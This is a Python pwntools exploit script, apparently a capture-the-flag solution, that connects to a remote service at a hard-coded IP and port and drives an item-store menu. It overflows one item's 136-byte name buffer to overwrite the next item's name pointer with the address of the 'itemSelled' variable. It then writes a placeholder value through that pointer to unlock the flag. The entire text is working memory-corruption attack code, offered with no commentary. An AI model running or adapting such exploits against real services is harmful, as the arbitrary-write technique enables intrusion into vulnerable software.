from pwn import *

elf = ELF('./chall')
p = remote('152.118.201.241', 3021)

itemSelled = elf.symbols['itemSelled']

def add(name, price):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Item name: ", name)
    p.sendlineafter(b"Item price: ", str(price).encode())

def edit(idx, name, price):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Item index", str(idx).encode())
    p.sendlineafter(b"Item name: ", name)
    p.sendlineafter(b"Item price: ", str(price).encode())

def getflag():
    p.sendlineafter(b"> ", b"5")

add(b"A"*8, 1)
add(b"B"*8, 1)

# overflow: item0 -> overwrite item1.name
payload = b"A"*136
payload += p64(itemSelled)

edit(0, payload, 1)

# item1.name = &itemSelled
target = 0x1234567812345678

edit(1, p64(target), 1)

getflag()
p.interactive()